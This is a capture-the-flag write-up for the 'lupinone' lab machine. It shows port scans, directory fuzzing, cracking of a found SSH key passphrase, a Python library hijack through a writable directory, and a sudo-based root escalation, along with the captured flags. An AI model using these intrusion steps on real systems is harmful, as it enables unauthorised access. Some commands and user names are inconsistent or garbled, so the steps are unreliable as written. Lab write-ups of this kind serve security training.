[*] lupinone [*]

# Date : 09/01/2022

# ->Enumeration Phase:
# Nmap 7.91 scan initiated Mon Jan 10 10:12:14 2022 as: nmap -sC -sV -p- -vv -oN nmap_all 192.168.0.109
Nmap scan report for 192.168.0.109
Host is up, received arp-response (0.00026s latency).
Scanned at 2022-01-10 10:12:15 IST for 13s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaL5p72wiDPedc7E90ri+viPAaxmn+59SWIoEF4hd4H3ethRxcpkU+DVtTgDbSwCK99T9jAjE0o2V6NLYKRW6dzHjVfUcvXRSlLyM2ffBETKcw4qqdoheEu7S52Q8ZInAavtS0tdL8HsO/0QoXBmtUl/ted9yf+X7Y3C+HcnMEZw+5+vTRObwn3K5jeCPCViZoapIGJM/a+YDpRmwZjeRhuf1gEDXFnqUB+Ro5gC19+/3GvY9O9VbIat02ckAUhNiDqMEj3DDsj5m9PS8FG7aGgYFJIQ53QUSw6JIw4cKhs72VtwjGr4ghaOTC1JFudKyzWwAZvaWnJdbR4KhkjCVGyZHQ443Bq+MhTmS6aX56oVBeWPucaudyhemrYQiRBRi7uXRxcuVtpvetgA6X4TVgbkwKI0EvMxblolJZYcyUHKZ2TmrxtAi6UV6vY0+uqUUcZZgbzb2qBdOI2avxGaX0nrBMbahjQS0nNz2UI/4qf0bfkXyC6arnTKg67/zKyGs=
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP89M+Gx4b3irH4ph8Fyq2lBuyLq2yqNfRV4CpNpwlVLMYi53OnWVyIYnwWFxi1VsK3Rze4qBmgQy9Qaun6Uixs=
|   256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBMI8KKmlP6LyPMawRRmpwVKGOd5QvO5Ob29UcLugTPY
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.48 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:3A:23:02 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 10 10:12:28 2022 -- 1 IP address (1 host up) scanned in 14.15 seconds

# Directory Bruteforce:

Target: http://192.168.0.109/

[10:19:37] Starting: 
[10:19:41] 403 -  278B  - /.ht_wsr.txt
[10:19:41] 403 -  278B  - /.htaccess.bak1
[10:19:41] 403 -  278B  - /.htaccess.orig
[10:19:41] 403 -  278B  - /.htaccess.save
[10:19:41] 403 -  278B  - /.htaccess_extra
[10:19:41] 403 -  278B  - /.htaccess.sample
[10:19:41] 403 -  278B  - /.htaccessOLD2
[10:19:41] 403 -  278B  - /.htaccessOLD
[10:19:41] 403 -  278B  - /.htaccess_sc
[10:19:41] 403 -  278B  - /.htaccessBAK
[10:19:41] 403 -  278B  - /.htpasswd_test
[10:19:41] 403 -  278B  - /.htm
[10:19:41] 403 -  278B  - /.htaccess_orig
[10:19:41] 403 -  278B  - /.htpasswds
[10:19:41] 403 -  278B  - /.httr-oauth
[10:19:41] 403 -  278B  - /.html
[10:20:30] 301 -  314B  - /image  ->  http://192.168.0.109/image/
[10:20:30] 200 -  333B  - /index.html
[10:20:32] 301 -  319B  - /javascript  ->  http://192.168.0.109/javascript/
[10:20:37] 301 -  315B  - /manual  ->  http://192.168.0.109/manual/
[10:20:37] 200 -  676B  - /manual/index.html
[10:20:53] 200 -   34B  - /robots.txt
[10:20:55] 403 -  278B  - /server-status/
[10:20:55] 403 -  278B  - /server-status

Task Completed
[10:42:09] 301 -  318B  - /manual/de  ->  http://192.168.0.109/manual/de/
[10:42:11] 301 -  318B  - /manual/en  ->  http://192.168.0.109/manual/en/
[10:42:12] 301 -  318B  - /manual/es  ->  http://192.168.0.109/manual/es/
[10:42:15] 301 -  318B  - /manual/fr  ->  http://192.168.0.109/manual/fr/
[10:42:19] 301 -  322B  - /manual/images  ->  http://192.168.0.109/manual/images/
[10:42:19] 200 -   10KB - /manual/images/
[10:42:20] 200 -  676B  - /manual/index.html
[10:42:49] 301 -  318B  - /manual/ru  ->  http://192.168.0.109/manual/ru/   
[10:42:57] 301 -  321B  - /manual/style  ->  http://192.168.0.109/manual/style/

>>Find a directory robots.txt in which ~myfiles directory is disallowed.
>> then i go the ~myfiles directory ,but nothing found . simply display "page 404" on the page.
>> ~ symbols are used in old apache configuration as home directory of that web server.
>> so i brute force the directory or fuzz it and found a ~secret directory using following command.

$
wfuzz -c -z file,<bruteforce_directory> http://<IP>/~FUZZ --hc 404
$

>>When i visit that directory i found some text.

$
Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
I'm smart I know that.
Any problem let me know
Your best friend icex64 
$

>> Means Username : icex64 
>> In this text clearly mention that ssh private key hidden somathere and we know platform is linux.
>> So i fuzz again a file  in which ssh private is prasent by using '.' symbol because in linux
>> files are hidden by giving . at the starting of the file

$
wfuzz -c -z file,<bruteforce_directory> http://<IP>/~secret/.FUZZ --hc 404
$  

>> Find a mysecret.txt file in which ssh private key is prasent .
>> download this file and for making this key john tool readable i use ssh2john.py tool.
>> and at last find a ssh private key by cracking using john the ripper tool.

# password : P@55w0rd!
>> and finally got a icex64 user shell.

# ->Eploitation Phase:

# user.txt : 3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}

>> this user can run a python file having owner arsene user using sudo command .
>> when i run command sudo -l:
	/usr/lib/python3.9 /home/arsene/python_file.
>> this python file simply import webbrowser module a print a simple line. anyone can change the
>> content of file because the file is only writable by ersene user.
>> after some enumeration i found that webbrowser.py file is present in /usr/lib/python3.9 diretory 
>> and this directory is writable by anyone.
>> so i change the content of the file.simple import os module and run os.system("bash).
>> then execute a following command and obtain ersene user shell.

$
sudo -u ersene /usr/lib/python3.9 /home/arsene/python_file
$ 

# ->Postexploitation Phase:
>> again run sudo -l command and this time cp command having rights of running as root by uing sudo.
>> so i run following command and got a root shell.

$
sudo cp /bin/sh /bin/cp
sudo cp
$

# root.txt : 3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}


